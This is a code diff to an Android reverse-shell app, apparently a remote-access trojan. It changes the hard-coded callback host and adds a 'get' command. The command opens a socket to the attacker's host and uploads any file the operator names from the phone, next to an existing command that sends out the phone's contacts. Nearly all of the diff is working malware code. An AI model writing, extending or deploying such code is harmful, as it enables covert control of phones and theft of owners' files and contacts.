@@ -5,6 +5,7 @@ import android.text.TextUtils;
 import android.util.Log;
 
 import com.anythingintellect.androidreverseshell.internalcmdutils.ContactHelper;
+import com.anythingintellect.androidreverseshell.internalcmdutils.GetHelper;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -12,8 +13,11 @@ import org.json.JSONObject;
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.IOException;
+import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.io.OutputStream;
 import java.net.Socket;
 
 /**
@@ -22,11 +26,12 @@ import java.net.Socket;
 
 public class ReverseTcpRunnable implements Runnable {
     private static final long RETRY_WAIT_TIME = 10000;
-    String host = "192.168.1.15";
+    String host = "192.168.43.6";
     int port = 443;
     private String directory = "/";
     private static final String CMD_CD = "cd";
     private static final String CMD_CONTACT = "contact";
+    private static final String CMD_GET = "get";
     private Context mContext;
 
     public ReverseTcpRunnable(Context context) {
@@ -162,7 +167,7 @@ public class ReverseTcpRunnable implements Runnable {
     private boolean tryInternalCommand(String[] cmd, DataOutputStream toServer) {
         switch (cmd[0]) {
             case CMD_CD: {
-                String dir = cmd[1];
+                String dir = GetHelper.getDirNameFromCmd(cmd);
                 if(dir.startsWith("/")) {
                     directory = dir;
                 } else {
@@ -176,6 +181,33 @@ public class ReverseTcpRunnable implements Runnable {
                 JSONArray contacts = ContactHelper.fetchContact(mContext);
                 shotResponseLine(contacts.length()+ " Contacts Found!", toServer);
                 shotResponseArray(contacts, toServer);
+                return true;
+            }
+            case CMD_GET: {
+                // To be tested
+                if (cmd.length > 1) {
+                    String filePath = directory + "/" + cmd[1];
+                    File file = new File(filePath);
+                    if (file.exists()) {
+                        try {
+                            Socket dataSock = new Socket(host, port);
+                            InputStream fileStream = new FileInputStream(file);
+                            OutputStream sockStream = dataSock.getOutputStream();
+                            byte[] buffer = new byte[1024];
+                            int count;
+                            while ((count = fileStream.read(buffer))> 0) {
+                                sockStream.write(buffer,0, count);
+                            }
+                            sockStream.close();
+                            fileStream.close();
+                            dataSock.close();
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
+                    }
+                } else {
+                    shotResponseLine("Specify File Name!", toServer);
+                }
                 return true;
             }
         }
